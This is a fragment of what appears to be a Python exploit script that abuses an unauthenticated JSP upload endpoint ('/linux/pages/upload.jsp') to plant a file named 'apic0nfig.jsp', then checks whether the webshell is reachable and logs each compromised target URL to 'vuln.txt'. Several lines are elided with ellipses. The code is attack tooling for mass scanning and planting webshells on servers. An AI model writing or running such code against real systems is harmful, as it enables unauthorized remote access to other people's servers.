...
def check_vuln(url):
	...
	vuln_url ='{}/linux/pages/upload.jsp'.format(url1)
	headers = {
		'User-Agent': get_ua(),
		'Content-Type': 'application/x-www-form-urlencoded',
		'filename': 'apic0nfig.jsp',
	}
	...
	try:
		...
		if res.status_code == 200:
			...
			# path = path.replace('..','')
			webshell = '{}/linux/apic0nfig.jsp'.format(url1)
			getshell = requests.get(webshell,timeout=15,verify=False)
			if getshell.status_code == 200 :
				print('\033[32m[+]webshell: {}\033[0m'.format(webshell))
				wirte_targets(webshell,"vuln.txt")
			else:
				print("\033[34m[-]{} webshell file does not exist. {}\033[0m".format(url1,getshell.status_code))
		else:
